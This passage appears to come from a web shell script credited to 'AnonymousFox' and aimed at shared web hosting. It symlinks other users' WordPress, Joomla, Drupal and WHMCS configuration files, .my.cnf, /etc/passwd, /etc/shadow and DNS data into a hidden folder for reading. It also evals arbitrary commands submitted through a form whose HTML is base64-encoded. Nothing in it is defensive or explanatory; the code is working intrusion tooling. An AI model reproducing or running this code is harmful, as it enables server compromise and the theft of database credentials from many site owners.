eval "ln -s /home/$i/public_html/clients/configuration.php ../.F0x/F0xConfig/Other/$i-client.txt";
eval "ln -s /home/$i/public_html/billing/configuration.php ../.F0x/F0xConfig/Other/$i-billing.txt";
eval "ln -s /home/$i/public_html/billings/configuration.php ../.F0x/F0xConfig/Other/$i-billings.txt";
eval "ln -s /home/$i/public_html/whmcs/configuration.php ../.F0x/F0xConfig/Other/$i-whmcs2.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../.F0x/F0xConfig/Other/$i-whmcs3.txt";
eval "ln -s /home/$i/public_html/my/configuration.php ../.F0x/F0xConfig/Other/$i-whmcs4.txt";
eval "ln -s /home/$i/public_html/whm/configuration.php ../.F0x/F0xConfig/Other/$i-whm.txt";
eval "ln -s /home/$i/public_html/whmc/configuration.php ../.F0x/F0xConfig/Other/$i-whmc.txt";
eval "ln -s /home/$i/public_html/support/configuration.php ../.F0x/F0xConfig/Other/$i-support.txt";
eval "ln -s /home/$i/public_html/supports/configuration.php ../.F0x/F0xConfig/Other/$i-supports.txt";
eval "ln -s /home/$i/public_html/vb/includes/config.php ../.F0x/F0xConfig/Other/$i-vb.txt";
eval "ln -s /home/$i/public_html/includes/config.php ../.F0x/F0xConfig/Other/$i-vb2.txt";
eval "ln -s /home/$i/public_html/config.php ../.F0x/F0xConfig/Other/$i-2.txt";
eval "ln -s /home/$i/public_html/forum/includes/config.php ../.F0x/F0xConfig/Other/$i-forum.txt";
eval "ln -s /home/$i/public_html/forums/includes/config.php ../.F0x/F0xConfig/Other/$i-forums.txt";
eval "ln -s /home/$i/public_html/admin/conf.php ../.F0x/F0xConfig/Other/$i-5.txt";
eval "ln -s /home/$i/public_html/admin/config.php ../.F0x/F0xConfig/Other/$i-4.txt";
eval "ln -s /home/$i/public_html/configuration.php ../.F0x/F0xConfig/Joomla/$i-joomla.txt";
eval "ln -s /home/$i/public_html/joomla/configuration.php ../.F0x/F0xConfig/Joomla/$i-joomla-joomla.txt";
eval "ln -s /home/$i/public_html/new/configuration.php ../.F0x/F0xConfig/Joomla/$i-joomla-new.txt";
eval "ln -s /home/$i/public_html/old/configuration.php ../.F0x/F0xConfig/Joomla/$i-joomla-old.txt";
eval "ln -s /home/$i/public_html/web/configuration.php ../.F0x/F0xConfig/Joomla/$i-joomla-web.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../.F0x/F0xConfig/Joomla/$i-joomla-portal.txt";
eval "ln -s /home/$i/public_html/site/configuration.php ../.F0x/F0xConfig/Joomla/$i-joomla-site.txt";
eval "ln -s /home/$i/public_html/test/configuration.php ../.F0x/F0xConfig/Joomla/$i-joomla-test.txt";
eval "ln -s /home/$i/public_html/demo/configuration.php ../.F0x/F0xConfig/Joomla/$i-joomla-demo.txt";
eval "ln -s /home/$i/public_html/sites/default/settings.php ../.F0x/F0xConfig/Drupal/$i-drupal.txt";
eval "ln -s /home/$i/public_html/drupal/sites/default/settings.php ../.F0x/F0xConfig/Drupal/$i-drupal2.txt";
eval "ln -s /home/$i/public_html/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress.txt";
eval "ln -s /home/$i/public_html/blog/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-blog.txt";
eval "ln -s /home/$i/public_html/new/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-new.txt";
eval "ln -s /home/$i/public_html/old/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-old.txt";
eval "ln -s /home/$i/public_html/blogs/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-blogs.txt";
eval "ln -s /home/$i/public_html/wp/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-wp.txt";
eval "ln -s /home/$i/public_html/beta/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-beta.txt";
eval "ln -s /home/$i/public_html/wordpress/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-wordpress.txt";
eval "ln -s /home/$i/public_html/demo/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-demo.txt";
eval "ln -s /home/$i/public_html/test/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-test.txt";
eval "ln -s /home/$i/public_html/site/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-site.txt";
eval "ln -s /home/$i/public_html/web/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-web.txt";
eval "ln -s /home/$i/public_html/portal/wp-config.php ../.F0x/F0xConfig/WordPress/$i-wordpress-portal.txt";
eval "ln -s /home/$i/public_html/conf_global.php ../.F0x/F0xConfig/Other/$i-6.txt";
eval "ln -s /home/$i/public_html/include/db.php ../.F0x/F0xConfig/Other/$i-7.txt";
eval "ln -s /home/$i/public_html/connect.php ../.F0x/F0xConfig/Other/$i-8.txt";
eval "ln -s /home/$i/public_html/mk_conf.php ../.F0x/F0xConfig/Other/$i-9.txt";
eval "ln -s /home/$i/public_html/include/config.php ../.F0x/F0xConfig/Other/$i-10.txt";
eval "ln -s /home/$i/public_html/appuser/functions.php ../.F0x/F0xConfig/Other/$i-tr.txt";
eval "ln -s /home/$i/.contactemail ../.F0x/F0xContactEmail/$i-contactemail.txt";
eval "ln -s /home/$i/public_html/.htaccess ../.F0x/F0xHtaccess/$i-htaccess.txt";
eval "ln -s /home/$i/public_html/images/ ../.F0x/F0xUpload/$i-images";
eval "ln -s /home/$i/public_html/wp-content/uploads/ ../.F0x/F0xUpload/$i-uploads";
eval "ln -s /home/$i/public_html/tmp/ ../.F0x/F0xUpload/$i-tmp";
eval "ln -s /home/$i/public_html/system/logs/ ../.F0x/F0xUpload/$i-logs";
eval "ln -s /home/$i/public_html/system/storage/logs/ ../.F0x/F0xUpload/$i-slogs";
eval "ln -s /var/log/domlogs/$i/ ../.F0x/F0xData/F0xSDU/$i-SDU";
eval "ln -s /etc/passwd ../.F0x/F0xData/passwd.txt";
eval "ln -s /etc/shadow ../.F0x/F0xData/shadow.txt";
eval "ln -s /etc/named.conf ../.F0x/F0xData/named.conf.txt";
eval "ln -s /home/$i/.my.cnf ../.F0x/F0xData/cPanel/$i-cPanel.txt" ;
eval "ln -s /var/named/ ../.F0x/F0xData/DomainDB" ;
done
echo 'PC94bXA+PGRpdiBhbGlnbj0nY2VudGVyJz48YnI+IFN5bUxpbmtzIDxhIHRhcmdldD0nX2JsYW5r
JyBocmVmPScuLi8uRjB4Jz5DbGljayBoZXJlPC9hPiA8L2Rpdj4=' | base64 -d
fi
if [ -n "$cc"  ] ; then
echo "<table border='0' width='100%'><tr><td align='center'><div class='box' align='left'><xmp>"
cd $d 
eval $cc
echo $?
echo '</xmp></div></pre></td></tr></table><br><br>'
fi
echo 'PGJyPjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgoJCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4KCTxkaXYgYWxpZ249ImNlbnRlciI+PHRhYmxlIGJvcmRlcj0iMCIgd2lkdGg9IjEyMCIgaWQ9InRhYmxlMSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIwIj48dHI+PHRkIHdpZHRoPSI3MTIiPiBFeGVjdXRlOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY2MiIHNpemU9IjEwMCIgIC8+PC90ZD48dGQ+PC90ZD48L3RyPjx0cj48dGQgd2lkdGg9IjcxMiI+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImQiIHNpemU9IjEwMCIgdmFsdWU9Ig==' | base64 -d
pwd  
echo 'Ii8+CjwvdGQ+PHRkPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImJ1dHRvbjEiIHZhbHVlPSJTZW5kIiAvPjwvdGQ+PC90cj48L3RhYmxlPjwvZGl2PjwvZm9ybT48YnI+PGJyPgo8YnI+PGJyPjxocj48Y2VudGVyPg==' | base64 -d

echo '<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<center><font style="color:white;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland">Coder </font><font style="color:black;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland">:</font><font style="color:red;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland"> AnonymousFox</font></center>
<br>
</BODY>
</HTML>'
